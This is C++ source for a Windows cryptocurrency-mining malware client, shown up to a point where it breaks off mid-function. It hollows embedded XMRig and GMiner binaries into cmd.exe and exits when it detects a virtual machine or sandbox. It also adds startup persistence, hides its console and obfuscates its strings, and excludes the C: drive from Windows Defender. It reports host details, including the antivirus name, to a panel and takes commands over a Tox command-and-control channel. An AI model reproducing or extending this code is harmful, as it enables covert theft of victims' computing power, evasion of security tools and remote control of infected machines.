#include <windows.h>

#include <iostream>
#include <stdio.h>
#include <csignal>
#include <atomic>
#include <thread>

#include "../include/ntddk.h"
#include "../include/kernel32_undoc.h"
#include "../include/util.h"

#include "../include/pe_hdrs_helper.h"
#include "../include/hollowing_parts.h"
#include "../include/delete_pending_file.h"
#include "../include/http_client.h"
#include "../include/json_printer.h"
#include "../include/config_manager.h"
#include "../include/encryption.h"
#include "../include/embedded_resource.h"
#include "../include/dvm_str.h"


#include "../src/inject_core.cpp"

#ifdef ENABLE_ANTIVM
#include "../include/antivm.h"
#endif

#ifdef ENABLE_PERSISTENCE
#include "../include/persistence.h"
#endif

#ifdef ENABLE_FOREIGN_MINER_KILLER
#include "../include/foreign_miner_killer.h"
#endif

#ifdef ENABLE_TOX_C2
#include "../include/tox_c2.h"
#include <mutex>
#include <string>
#include <deque>

static std::atomic<bool> g_toxStopRequested{false};
static std::atomic<bool> g_toxRestartRequested{false};

// Pending mining configs delivered over Tox ("config <json>") — queue to avoid loss on burst.
static std::mutex g_toxConfigMutex;
static std::deque<std::string> g_toxConfigQueue;
#endif

#ifdef ENABLE_TOX_CONFIG
#include "tox_config_generated.h"
#endif

// Every std::cout / std::cerr in this file is compiled out unless the debug
// console feature is on. In release builds the client is silent — the panel
// POST payload (wallet + hostname + device hash) and Tox savedata never
// reach any stdout that could be piped through a persistence path.
#ifdef ENABLE_DEBUG_CONSOLE
#define LOG(x)  do { std::cout << x; } while (0)
#define ERR(x)  do { std::cerr << x; } while (0)
#else
#define LOG(x)  do { (void)0; } while (0)
#define ERR(x)  do { (void)0; } while (0)
#endif

// Global variables for signal handling — atomics because Windows dispatches
// CTRL handlers on a dedicated thread that races the main loop's ProcessStorage
// handles and the Tox thread. Use atomics + exchange to avoid double-CloseHandle.
static std::atomic<HANDLE> g_cpuMinerProcess{NULL};
static std::atomic<HANDLE> g_gpuMinerProcess{NULL};
static std::atomic<bool> g_shouldExit{false};

BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT || signal == CTRL_BREAK_EVENT ||
        signal == CTRL_CLOSE_EVENT || signal == CTRL_SHUTDOWN_EVENT) {
        LOG("[!] Signal received, terminating miner processes..." << std::endl);
        HANDLE h = g_cpuMinerProcess.exchange(NULL);
        if (h != NULL && h != INVALID_HANDLE_VALUE) {
            TerminateProcess(h, 0);
            CloseHandle(h);
        }
        h = g_gpuMinerProcess.exchange(NULL);
        if (h != NULL && h != INVALID_HANDLE_VALUE) {
            TerminateProcess(h, 0);
            CloseHandle(h);
        }
        g_shouldExit.store(true);
        return TRUE;
    }
    return FALSE;
}


int main(int argc, char *argv[])
{
    // Persisted restarts (scheduled task / Run key) pass --hidden to run with
    // no visible console window. Manual runs stay visible for debugging.
    for (int i = 1; i < argc; ++i) {
        if (std::string(argv[i]) == "--hidden") {
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            break;
        }
    }

    // Single-instance guard. Every previous build shared the fixed name
    // "Global\\CMM" — trivially discoverable via `strings bminer.exe` and
    // squatable by any process (a defender that opens the mutex first
    // permanently prevents the client from starting anywhere on the box).
    // Derive a per-session, per-install name from the device hash instead
    // (Local\ scope so we don't need SeCreateGlobalPrivilege), and only
    // include enough of the hash to stay identifiable to ourselves.
    {
        const std::string mtxName = std::string("Local\\bmn_") +
                                    GetComputerHash().substr(0, 16);
        if (IsAnotherInstanceRunning(mtxName.c_str())) {
            LOG("[!] Another instance is already running. Exiting." << std::endl);
            return 0;
        }
    }

    // Register signal handler to cleanup miner process on termination
    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[-] Failed to set console control handler" << std::endl;
#endif
    }

#ifdef ENABLE_ANTIVM
    // Run anti-VM detection
    auto vmResult = AntiVM::DetectVM();
    if (vmResult.first) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[!] VM/Sandbox detected: " << vmResult.second << std::endl;
#endif
        // Exit silently in release mode to avoid detection
        return 0;
    }
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[+] Anti-VM check passed: " << vmResult.second << std::endl;
#endif
#endif

#ifdef ENABLE_PERSISTENCE
    // Add to startup for persistence
    if (Persistence::AddToStartup()) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Successfully added to startup" << std::endl;
#endif
    } else {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[-] Failed to add to startup" << std::endl;
#endif
    }
#endif

    // Builder rewrites this line at build time (see modifySourceFiles in
    // buildsystem.cpp). The regex looks for the exact form
    // `std::string panelUrlsStr = "...";` — do not change it to a constructor
    // or DVM_STR call without updating the builder regex to match.
    std::string panelUrlsStr = "http://127.0.0.1:8080/api/miners/submit";
    std::string configGetUrlStr = "";

    // config_link mode with an empty URL is a build-time misconfiguration: the
    // client has no way to fetch a config and would silently mine with stale
    // embedded settings. Fail loudly so the builder catches it during testing.
#ifdef CONFIG_UPDATE_MODE
    if (std::string(CONFIG_UPDATE_MODE) == "config_link" && configGetUrlStr.empty()) {
        std::cerr << "[-] config_link mode requires a non-empty config URL. Exiting." << std::endl;
        return 1;
    }
#endif

    // How this client receives updated mining config, chosen by the builder:
    //   "endpoint"    - POST system info to the panel, receive config back
    //   "config_link" - GET config directly from a URL
    //   "tox"         - start from embedded config, updates arrive over Tox C2
#ifdef CONFIG_UPDATE_MODE
    const std::string kConfigMode = CONFIG_UPDATE_MODE;
#else
    const std::string kConfigMode = "endpoint";
#endif

    // Client version - update this for each release
    const std::string CLIENT_VERSION = "3.0.0";

    // Prefix used when passing XOR-encrypted XMRig args to the injected process
    const char* rawEncPrefix = DVM_STR("--encargs ");
    const std::string ENC_ARGS_PREFIX(rawEncPrefix);
    DVM_FREE(rawEncPrefix);

    // Pre-encrypt common GPU mining argument strings to stay under 16 encryption limit

    // Map synthetic panel algo names to GMiner --algo values.
    // Equihash coins share the same base algo but differ only by --pers string.
    auto getAlgoMapping = [](const std::string& algo) -> std::string {
        const char* kBTG = DVM_STR("equihash144_5_btg");
        const char* kZEN = DVM_STR("equihash144_5_zen");
        const char* kZEC = DVM_STR("equihash125_4_zec");
        bool is144 = (algo == kBTG || algo == kZEN);
        DVM_FREE(kBTG); DVM_FREE(kZEN);
        if (is144) {
            const char* v = DVM_STR("equihash144_5");
            std::string r(v);
            DVM_FREE(v);
            DVM_FREE(kZEC);
            return r;
        }
        bool is125 = (algo == kZEC);
        DVM_FREE(kZEC);
        if (is125) {
            const char* v = DVM_STR("equihash125_4");
            std::string r(v);
            DVM_FREE(v);
            return r;
        }
        return algo;
    };

    // Return the personalization string for equihash algos (empty = no --pers needed).
    auto getPersString = [](const std::string& algo) -> std::string {
        const char* kBTG = DVM_STR("equihash144_5_btg");
        const char* kZEN = DVM_STR("equihash144_5_zen");
        const char* kZEC = DVM_STR("equihash125_4_zec");
        bool isBtg = (algo == kBTG);
        bool isZec = (algo == kZEN || algo == kZEC);
        DVM_FREE(kBTG); DVM_FREE(kZEN); DVM_FREE(kZEC);
        const char* key = isBtg ? DVM_STR("BgoldPoW") : (isZec ? DVM_STR("ZcashPoW") : DVM_STR(""));
        std::string r(key);
        DVM_FREE(key);
        return r;
    };

    // Single source of truth for the GMiner command line, so the initial launch,
    // config-update and idle-state paths can never drift apart.
    auto buildGminerArgs = [&](const MinerConfig& c) -> std::string {
        const char* kA1 = DVM_STR("--algo ");
        const char* kS1 = DVM_STR(" --server ");
        const char* kU1 = DVM_STR(" --user ");
        const char* kW1 = DVM_STR(" --worker ");
        const char* kO1 = DVM_STR(" --ssl 0");
        const char* kO2 = DVM_STR(" --ssl 1");
        const char* kP1 = DVM_STR(" --pers ");
        const char* kF1 = DVM_STR(" --fan ");
        const char* kA2 = DVM_STR(" --api 21550 --watchdog 0 --color 0");
        std::string args(kA1);
        args += getAlgoMapping(c.algo);
        const std::string pers = getPersString(c.algo);
        if (!pers.empty()) { args += kP1; args += pers; }
        args += kS1; args += c.mining_url;
        args += kU1; args += c.wallet; args += "."; args += c.password;
        args += kW1; args += c.password;
        args += (c.use_ssl == 1 ? std::string(kO2) : std::string(kO1));
        if (c.fan_speed > 0 && IsRunningAsAdmin()) { args += kF1; args += std::to_string(c.fan_speed); }
        args += kA2;
        DVM_FREE(kA1); DVM_FREE(kS1); DVM_FREE(kU1); DVM_FREE(kW1); DVM_FREE(kO1); DVM_FREE(kO2);
        DVM_FREE(kP1); DVM_FREE(kF1); DVM_FREE(kA2);
        return args;
    };

    // Whether the GPU should be mining right now. GMiner has no percentage
    // throttle, so idle/non-idle usage is interpreted as on (>0) / off (0).
    auto gpuShouldMine = [](const MinerConfig& c, bool isIdle) -> bool {
        const double usage = isIdle ? c.idle_usage : c.non_idle_usage;
        return c.enabled == 1 && usage > 0.0;
    };
    
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[DEBUG] Decrypted Panel URL(s): " << panelUrlsStr << std::endl;
    std::cout << "[DEBUG] Decrypted Config URL: " << (configGetUrlStr.empty() ? "(not set)" : configGetUrlStr) << std::endl;
#endif
    
    // Get system information (needed for both GET and POST methods)
    std::string pcUsername = GetWindowsUsername();
    std::string deviceHash = GetComputerHash();
    std::string cpuName = GetCPUName();
    std::string gpuName = GetGPUName();
    std::string antivirusName = GetAntivirusName();

#ifdef ENABLE_FOREIGN_MINER_KILLER
    // The killer stays passive when another instance owns the colony mutex, so
    // two clients can never terminate each other's miners.
    const bool fmkActive = ForeignMinerKiller::Initialize(deviceHash);
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << (fmkActive ? "[+] Foreign Miner Killer active"
                            : "[-] Foreign Miner Killer passive (another instance owns the colony)")
              << std::endl;
#endif
#endif
    
    // Initialize config manager
    ConfigManager configManager;

    // Determine which config fetch method to use
    if (kConfigMode == "tox") {
        // Tox mode: no panel / config URL. Start from the embedded fallback and
        // wait for the operator to push config over the C2 channel.
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Tox config mode - loading embedded fallback config..." << std::endl;
#endif
        if (!configManager.LoadEmbeddedConfig()) {
            std::cerr << "[-] Failed to load embedded config (tox mode). Exiting." << std::endl;
            return 1;
        }
    } else if (kConfigMode == "config_link") {
        // Use direct GET request to fetch config with fallback
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Fetching configuration from URL via GET request..." << std::endl;
#endif
        if (!configManager.FetchConfigFromUrlWithFallback(configGetUrlStr)) {
            std::cerr << "[-] Failed to fetch configuration from config URL. Exiting." << std::endl;
            return 1;
        }
    } else {
        // Use traditional method: send system info and POST to panel
        
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] System Information:" << std::endl;
        std::cout << "    Username: " << pcUsername << std::endl;
        std::cout << "    Device Hash: " << deviceHash << std::endl;
        std::cout << "    CPU: " << cpuName << std::endl;
        std::cout << "    GPU: " << gpuName << std::endl;
        std::cout << "    Antivirus: " << antivirusName << std::endl;
#endif
        
        // Fetch configuration from panel(s) with fallback support
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] Fetching configuration from panel..." << std::endl;
#endif
        if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, 0.0, 0.0, GetSystemUptimeMinutes())) {
            std::cerr << "[-] Failed to fetch configuration from all panel URLs. Exiting." << std::endl;
            return 1;
        }
    }

    const MinerConfig& cpuConfig = configManager.GetCPUConfig();
    const MinerConfig& gpuConfig = configManager.GetGPUConfig();
    
    // Verify we have valid configurations
    if (cpuConfig.mining_url.empty() && gpuConfig.mining_url.empty()) {
        const char* m = DVM_STR("[-] No valid configuration received. Exiting.");
        std::cerr << m << std::endl;
        DVM_FREE(m);
        return 1;
    }
    
    const bool is32bit = false;

    // Create mutable buffers for both miners
    wchar_t payloadPath[MAX_PATH] = {0};
    wchar_t targetPath[MAX_PATH] = {0};
    std::string _targetNarrow = "C:\\Windows\\system32\\cmd.exe";
    std::wstring targetStr(_targetNarrow.begin(), _targetNarrow.end());
    wcscpy_s(targetPath, MAX_PATH, targetStr.c_str());

    // Miners are always loaded from embedded PE resources — the remote-miner
    // download path was removed: pulling a fresh miner PE from the panel and
    // hollowing it into cmd.exe without integrity verification made every
    // deployed client hijackable by anyone who could compromise the panel URL
    // (expired domain, DNS hijack, HTTP-only downgrade). XMRig's built-in
    // stratum failover already covers the "swap pool without redeploy" use
    // case that remote-miners was intended to solve.
    size_t xmrigPayloadSize = 0;
    BYTE *xmrigBuf = nullptr;

#ifdef ENABLE_CPU_MINER
    try {
        LoadEmbeddedXMRig(xmrigBuf, xmrigPayloadSize);
#ifdef ENABLE_DEBUG_CONSOLE
        const char* mL = DVM_STR("[+] Loaded payload: ");
        std::cout << mL << xmrigPayloadSize << " bytes" << std::endl;
        DVM_FREE(mL);
#endif
    } catch (const std::exception& e) {
#ifdef ENABLE_DEBUG_CONSOLE
        const char* mF = DVM_STR("[-] Failed to load embedded payload: ");
        std::cerr << mF << e.what() << std::endl;
        DVM_FREE(mF);
#endif
        return -1;
    }
#else
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] CPU miner not enabled in this build" << std::endl;
#endif
#endif

    size_t gminerPayloadSize = 0;
    BYTE *gminerBuf = nullptr;

#ifdef ENABLE_GPU_MINER
    try {
        LoadEmbeddedGminer(gminerBuf, gminerPayloadSize);
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[+] Loaded GMiner payload: " << gminerPayloadSize << " bytes" << std::endl;
#endif
    } catch (const std::exception& e) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cerr << "[-] Failed to load GMiner from resources: " << e.what() << std::endl;
#endif
        gminerBuf = nullptr;
        gminerPayloadSize = 0;
    }
#else
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] GPU miner not enabled in this build" << std::endl;
#endif
#endif

    // Build command line arguments for CPU
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] Checking if device is idle (threshold: " << cpuConfig.wait_time_idle << " minutes)..." << std::endl;
#endif
    bool cpuIsIdle = IsDeviceIdle(cpuConfig.wait_time_idle);
    std::string cpuCommand = configManager.BuildCommandLineArgs(cpuConfig, cpuIsIdle);
    
    if (cpuCommand.empty()) {
        std::cerr << "[-] Failed to build CPU command line arguments" << std::endl;
    }
    
    // Store the initial config to detect changes
    MinerConfig lastCpuConfig = cpuConfig;
    MinerConfig lastGpuConfig = gpuConfig;
    
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[+] CPU Command: " << cpuCommand << std::endl;
#endif

    // Launch miners independently

    // CPU-miner launch args. Virtualized/protected payloads crash inside the
    // protected --encargs arg-rebuild path (STATUS_DATATYPE_MISALIGNMENT), so
    // for those we drop a %USERPROFILE%\.xmrig.json config file and launch with
    // no args; plain builds keep using the --encargs XOR-encrypted channel.
    const bool xmrigVirtualized = (xmrigBuf != nullptr) && pe_is_virtualized(xmrigBuf);
#ifdef ENABLE_DEBUG_CONSOLE
    std::cout << "[*] XMRig payload virtualized: " << (xmrigVirtualized ? "yes (config.json delivery)" : "no (--encargs delivery)") << std::endl;
#endif
    auto buildCpuArgs = [&](const MinerConfig& cfg, bool idle) -> LPWSTR {
        if (xmrigVirtualized) {
            configManager.WriteXmrigConfigJson(cfg, idle);
            return nullptr; // config dropped, launch with no args
        }
        std::string cmd = configManager.BuildCommandLineArgs(cfg, idle);
        return StringToLPWSTR(ENC_ARGS_PREFIX + XorEncryptToHex(cmd, pcUsername));
    };

    // Tox status handler reads these PIDs on its own thread, so keep them
    // atomic to avoid a torn read of a freshly-updated process id.
    std::atomic<DWORD> cpuPid{0};
    std::optional<PROCESS_INFORMATION> cpuPi;
    
    // Only launch XMRig if CPU mining is enabled, payload is available,
    // AND the current idle state actually allows mining.
    // (non_idle_usage==0 means "don't mine when busy" — launching with 0 threads
    //  sets cpuPid and blocks the monitor loop from re-launching when idle.)
    const double cpuInitialUsage = cpuIsIdle ? cpuConfig.idle_usage : cpuConfig.non_idle_usage;
    if (cpuConfig.enabled == 1 && cpuInitialUsage > 0.0 && !cpuCommand.empty()) {
        if (xmrigBuf == nullptr || xmrigPayloadSize == 0) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cerr << "[-] XMRig payload not available (remote download failed, no embedded fallback)" << std::endl;
#endif
        } else {
            cpuPid = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
                buildCpuArgs(cpuConfig, cpuIsIdle));
            cpuPi = ProcessStorage::GetProcess(cpuPid);
            // Verify the process is alive using its handle rather than a blind Sleep.
            // WAIT_OBJECT_0 means the process already exited (injection failure).
            if (cpuPid != 0 && cpuPi &&
                    WaitForSingleObject(cpuPi->hProcess, 0) != WAIT_OBJECT_0) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] Launched XMRig (CPU) into PID: " << cpuPid << std::endl;
#endif
            } else {
                const char* failMsg = DVM_STR("[-] payload injection failed!");
                std::cerr << failMsg << std::endl;
                DVM_FREE(failMsg);
                free_buffer(xmrigBuf);
                return 1;
            }
        }
    } else if (cpuConfig.enabled != 1) {
#ifdef ENABLE_DEBUG_CONSOLE
        std::cout << "[*] CPU mining disabled, skipping XMRig injection" << std::endl;
#endif
        free_buffer(xmrigBuf);
    }

    std::atomic<DWORD> gpuPid{0};
    std::optional<PROCESS_INFORMATION> gpuPi;
    
    if (gminerBuf != nullptr && gminerPayloadSize > 0)
    {
        // Only launch GMiner if the GPU should mine in the current idle state.
        const bool gpuIsIdle = IsDeviceIdle(gpuConfig.wait_time_idle);
        if (gpuShouldMine(gpuConfig, gpuIsIdle)) {
            const std::string gminer_args = buildGminerArgs(gpuConfig);

#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] GMiner payload size: " << gminerPayloadSize << " bytes" << std::endl;
            std::cout << "[+] GMiner arguments: " << gminer_args << std::endl;
#endif

            gpuPid = transacted_hollowing(targetPath, gminerBuf, (DWORD)gminerPayloadSize, StringToLPWSTR(gminer_args));
            gpuPi = ProcessStorage::GetProcess(gpuPid);

            if (gpuPid != 0) {
#ifdef ENABLE_DEBUG_CONSOLE
                std::cout << "[+] Launched GMiner (GPU) into PID: " << gpuPid << std::endl;
#endif
            } else {
                const char* m = DVM_STR("[-] GPU miner injection failed!");
                std::cerr << m << std::endl;
                DVM_FREE(m);
            }
        } else {
            if (gpuConfig.enabled != 1) {
                const char* m = DVM_STR("[*] GPU mining disabled, skipping GPU miner injection");
                std::cout << m << std::endl;
                DVM_FREE(m);
                free_buffer(gminerBuf);
                gminerBuf = nullptr;
            } else {
                const char* m = DVM_STR("[*] GPU mining not active for the current idle state, waiting");
                std::cout << m << std::endl;
                DVM_FREE(m);
            }
        }
    } else {
        const char* m = DVM_STR("[-] Failed to load GPU miner resource.");
        std::cerr << m << std::endl;
        DVM_FREE(m);
    }

#ifdef ENABLE_DEFENDER_EXCLUSION
    // Add C: drive to Windows Defender exclusion if running as admin
    if (IsRunningAsAdmin()) {
        std::cout << "[*] Attempting to add C: drive to Windows Defender exclusion..." << std::endl;
        if (AddDefenderExclusion("C:\\")) {
            std::cout << "[+] Successfully added C: drive to Windows Defender exclusion" << std::endl;
        } else {
            std::cerr << "[-] Failed to add C: drive to Windows Defender exclusion" << std::endl;
        }
    } else {
        std::cout << "[*] Not running as admin, skipping Windows Defender exclusion" << std::endl;
    }
#endif

    // Store process handles for the signal handler (atomics, cleared on close)
    if (cpuPi) g_cpuMinerProcess.store(cpuPi->hProcess);
    if (gpuPi) g_gpuMinerProcess.store(gpuPi->hProcess);
    int checkInCounter = 0;
    int idlePrintCounter = 0;
    int hashratePrintCounter = 0;
#ifdef ENABLE_FOREIGN_MINER_KILLER
    int fmkCounter = 0;
    const int FMK_INTERVAL = 30;  // seconds between foreign-miner sweeps
#endif
    // Panel check-in every 4 minutes. This is expressed as a counter of the
    // 1-second main-loop iterations (Sleep(1000) below), so the value is the
    // number of seconds between check-ins. The previous 15 was a typo that
    // hammered the panel 16× more than intended.
    const int CHECK_IN_INTERVAL    = 240;  // seconds (4 minutes)
    bool panelOnline = true; // we reached the panel successfully to get here

#ifdef ENABLE_TOX_C2
    // Start the Tox C2 channel. The operator identity and (optionally) a fixed
    // bot identity come from the builder: either the embedded tox pair, or the
    // id_tox field of the config. The handler runs on the Tox thread and only
    // touches atomics/mutexes, so it is safe to call concurrently.
    {
        char appdata[MAX_PATH] = {0};
        GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);

        ToxC2::Config toxCfg;
        toxCfg.name = std::string("bot-") + deviceHash.substr(0, 8);
        // The friend request itself carries the device hash so the operator's
        // Discover pass can identify this bot before any hello message.
        toxCfg.helloMessage = std::string("hello ") + deviceHash;
        // Store in a less predictable subdirectory that blends with Windows
        // crypto infrastructure — reduces forensic discoverability.
        {
            const std::string cryptoDir = std::string(appdata) + "\\Microsoft\\Crypto";
            CreateDirectoryA(cryptoDir.c_str(), nullptr); // no-op if already exists
            toxCfg.savedataPath = cryptoDir + "\\tox_save.dat";
        }

        bool haveOperator = false;
#ifdef ENABLE_TOX_CONFIG
        {
            // Embedded tox pair written by the builder: operator public key +
            // a fixed bot savedata. Preferred over the id_tox fallback.
            try {
                json toxJson = json::parse(GetEmbeddedToxConfigJson());
                if (toxJson.contains("operator") && toxJson["operator"].is_object()) {
                    toxCfg.operatorPkHex = toxJson["operator"].value("public_key", std::string());
                    toxCfg.operatorId = toxJson["operator"].value("id", std::string());
                    if (!toxCfg.operatorPkHex.empty() || toxCfg.operatorId.size() == 76)
                        haveOperator = true;
                    // Prefer full id for request, fall back to pk
                    if (toxCfg.operatorPkHex.empty() && toxCfg.operatorId.size() >= 64)
                        toxCfg.operatorPkHex = toxCfg.operatorId.substr(0, 64);
                }
                if (toxJson.contains("bot") && toxJson["bot"].is_object())
                    toxCfg.embeddedSavedataHex = toxJson["bot"].value("savedata_hex", std::string());
                if (toxJson.contains("name"))
                    toxCfg.name = toxJson.value("name", toxCfg.name);
            } catch (...) { }
        }
#endif
        if (!haveOperator) {
            toxCfg.operatorId = configManager.GetToxId();
            haveOperator = toxCfg.operatorId.size() == 76;
            if (haveOperator && toxCfg.operatorPkHex.empty())
                toxCfg.operatorPkHex = toxCfg.operatorId.substr(0, 64);
        }

        if (haveOperator) {
            ToxC2::Start(toxCfg, [deviceHash, pcUsername, cpuName, gpuName, antivirusName, CLIENT_VERSION, &configManager, &cpuPid, &gpuPid](const std::string& line) -> std::string {
                const size_t sp = line.find_first_of(" \t");
                std::string cmd = line.substr(0, sp);
                for (char& c : cmd)
                    if (c >= 'A' && c <= 'Z') c = static_cast<char>(c + 32);

                if (cmd == "ping")
                    return std::string("pong ") + deviceHash;
                if (cmd == "status") {
                    // Extended telemetry for the builder's Tox dashboard — mirrors
                    // the panel's minerReport (cpu_name/gpu_name/antivirus/hashrate)
                    // but as a single JSON reply so the builder can render a list.
                    try {
                        double cpuHr = 0.0;
                        if (cpuPid.load() != 0) cpuHr = GetMinerHashrate();
                        auto gpuHr = GetGPUMinerHashrate();
                        json j;
                        j["device_hash"] = deviceHash;
                        j["pc_username"] = pcUsername;
                        j["tox_id"] = ToxC2::GetSelfAddress();
                        j["cpu_pid"] = static_cast<int>(cpuPid.load());
                        j["gpu_pid"] = static_cast<int>(gpuPid.load());
                        j["uptime_min"] = GetSystemUptimeMinutes();
                        j["cpu_name"] = cpuName;
                        j["gpu_name"] = gpuName;
                        j["antivirus"] = antivirusName;
                        j["client_version"] = CLIENT_VERSION;
                        j["cpu_hashrate"] = cpuHr;
                        j["gpu_hashrate"] = gpuHr.first;
                        j["gpu_hashrate_unit"] = gpuHr.second;
                        return j.dump();
                    } catch (...) {
                        // Fallback to legacy key=value if JSON fails
                        return std::string("hash=") + deviceHash
                               + " user=" + pcUsername
                               + " tox=" + ToxC2::GetSelfAddress()
                               + " cpu=" + std::to_string(cpuPid.load())
                               + " gpu=" + std::to_string(gpuPid.load())
                               + " up=" + std::to_string(GetSystemUptimeMinutes());
                    }
                }
                if (cmd == "stop") { g_toxStopRequested.store(true); return std::string("stopping"); }
                if (cmd == "restart") { g_toxRestartRequested.store(true); return std::string("restarting miners"); }
                if (cmd == "config") {
                    std::string jsonStr;
                    if (sp != std::string::npos)
                        jsonStr = line.substr(sp + 1);
                    size_t a = jsonStr.find_first_not_of(" \t\r\n");
                    size_t b = jsonStr.find_last_not_of(" \t\r\n");
                    jsonStr = (a == std::string::npos) ? std::string() : jsonStr.substr(a, b - a + 1);
                    if (jsonStr.empty())
                        return std::string("usage: config <json>");
                    // Reject malformed JSON immediately so the operator gets a
                    // real error instead of a silent drop later.
                    try {
                        json::parse(jsonStr);
                    } catch (...) {
                        return std::string("config rejected: invalid json");
                    }
                    // Reject payloads above 512 KB — large enough for any real
                    // config, too small to be used as a memory-exhaustion vector.
                    if (jsonStr.size() > 512 * 1024)
                        return std::string("config rejected: too large");
                    {
                        std::lock_guard<std::mutex> lk(g_toxConfigMutex);
                        if (g_toxConfigQueue.size() >= 8) g_toxConfigQueue.pop_front(); // bound burst
                        g_toxConfigQueue.push_back(jsonStr);
                    }
                    return std::string("config queued");
                }
                return std::string("unknown command: ") + cmd;
            });
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[+] Tox C2 started" << std::endl;
#endif
            std::thread([deviceHash]{
                std::this_thread::sleep_for(std::chrono::seconds(8));
                for (int i=0;i<3;++i) {
                    ToxC2::SendToOperator(std::string("hello ") + deviceHash);
                    std::this_thread::sleep_for(std::chrono::seconds(15));
                }
                // Periodic heartbeat so late Discover always finds us
                while (!g_shouldExit.load() && ToxC2::IsRunning()) {
                    std::this_thread::sleep_for(std::chrono::seconds(60));
                    if (g_shouldExit.load() || !ToxC2::IsRunning()) break;
                    ToxC2::SendToOperator(std::string("hello ") + deviceHash);
                }
            }).detach();
        }
    }
#endif

    // Applies whatever config configManager now holds, restarting any miner
    // whose settings changed. Shared by the panel/config-link poll and the Tox
    // "config" command so both update paths behave identically.
    auto applyConfigUpdate = [&]() {
        MinerConfig newCpuConfig = configManager.GetCPUConfig();
        MinerConfig newGpuConfig = configManager.GetGPUConfig();

        bool cpuConfigChanged = (newCpuConfig.mining_url != lastCpuConfig.mining_url ||
                                 newCpuConfig.wallet != lastCpuConfig.wallet ||
                                 newCpuConfig.password != lastCpuConfig.password ||
                                 newCpuConfig.non_idle_usage != lastCpuConfig.non_idle_usage ||
                                 newCpuConfig.idle_usage != lastCpuConfig.idle_usage ||
                                 newCpuConfig.use_ssl != lastCpuConfig.use_ssl ||
                                 newCpuConfig.wait_time_idle != lastCpuConfig.wait_time_idle ||
                                 newCpuConfig.enabled != lastCpuConfig.enabled);

        bool gpuConfigChanged = (newGpuConfig.mining_url != lastGpuConfig.mining_url ||
                                 newGpuConfig.wallet != lastGpuConfig.wallet ||
                                 newGpuConfig.password != lastGpuConfig.password ||
                                 newGpuConfig.algo != lastGpuConfig.algo ||
                                 newGpuConfig.non_idle_usage != lastGpuConfig.non_idle_usage ||
                                 newGpuConfig.idle_usage != lastGpuConfig.idle_usage ||
                                 newGpuConfig.fan_speed != lastGpuConfig.fan_speed ||
                                 newGpuConfig.use_ssl != lastGpuConfig.use_ssl ||
                                 newGpuConfig.wait_time_idle != lastGpuConfig.wait_time_idle ||
                                 newGpuConfig.enabled != lastGpuConfig.enabled);

        if (cpuConfigChanged) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[*] CPU config changed — restarting XMRig (url=" << newCpuConfig.mining_url
                      << " wallet=" << newCpuConfig.wallet << ")" << std::endl;
#endif
            lastCpuConfig = newCpuConfig;

            if (cpuPi) {
                LOG("[*] Terminating XMRig PID " << cpuPid.load() << " for config update" << std::endl);
                TerminateProcess(cpuPi.value().hProcess, 0);
                if (WaitForSingleObject(cpuPi.value().hProcess, 5000) == WAIT_TIMEOUT)
                    TerminateProcess(cpuPi.value().hProcess, 1);
                if (PVOID veh = ProcessStorage::TakeVehBlock(cpuPid.load()))
                    VirtualFreeEx(cpuPi.value().hProcess, veh, 0, MEM_RELEASE);
                CloseHandle(cpuPi.value().hProcess);
                CloseHandle(cpuPi.value().hThread);
                ProcessStorage::RemoveProcess(cpuPid.load());
                g_cpuMinerProcess.store(NULL);
                cpuPid.store(0);
                cpuPi.reset();
            } else if (cpuPid.load() != 0) { g_cpuMinerProcess.store(NULL); cpuPid.store(0); }

            if (newCpuConfig.enabled == 1 && xmrigBuf != nullptr && xmrigPayloadSize > 0) {
                bool newCpuIsIdle = IsDeviceIdle(newCpuConfig.wait_time_idle);
                DWORD _np = transacted_hollowing(targetPath, xmrigBuf, (DWORD)xmrigPayloadSize,
                    buildCpuArgs(newCpuConfig, newCpuIsIdle));
                cpuPid.store(_np);
                cpuPi = ProcessStorage::GetProcess(_np);
                if (cpuPi) g_cpuMinerProcess.store(cpuPi->hProcess);
                LOG("[+] XMRig restarted after config update, new PID: " << cpuPid.load() << std::endl);
            }
        }

        if (gpuConfigChanged) {
#ifdef ENABLE_DEBUG_CONSOLE
            std::cout << "[*] GPU config updated" << std::endl;
#endif
            lastGpuConfig = newGpuConfig;

            if (gpuPi) {
                TerminateProcess(gpuPi.value().hProcess, 0);
                if (WaitForSingleObject(gpuPi.value().hProcess, 5000) == WAIT_TIMEOUT)
                    TerminateProcess(gpuPi.value().hProcess, 1);
                if (PVOID veh = ProcessStorage::TakeVehBlock(gpuPid.load()))
                    VirtualFreeEx(gpuPi.value().hProcess, veh, 0, MEM_RELEASE);
                CloseHandle(gpuPi.value().hProcess);
                CloseHandle(gpuPi.value().hThread);
                ProcessStorage::RemoveProcess(gpuPid.load());
                g_gpuMinerProcess.store(NULL);
